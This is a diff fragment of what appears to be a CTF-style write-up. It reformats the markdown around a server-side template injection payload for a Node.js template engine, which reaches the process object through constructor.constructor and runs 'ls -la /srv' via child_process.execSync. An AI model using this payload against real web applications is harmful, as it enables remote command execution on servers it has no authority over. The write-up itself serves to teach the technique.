@@ -164,7 +164,7 @@ Why this works:
 
 **Payload used**
 
-```
+``
 <%- (function(){
   try{
     var p = this.constructor.constructor('return process')();
@@ -174,8 +174,8 @@ Why this works:
   }catch(e){ return e.toString() }
 })() %>
 
-```
-** What this does :**
+``
+**What this does :**
 
 - Uses `process.mainModule.require('child_process').execSync` to run `ls -la /srv`.
 (You might be asking yourself why run `ls -la` instead of `ls` .. it's simple we need to see the permissions on the file if it exists and to see hidden files too)
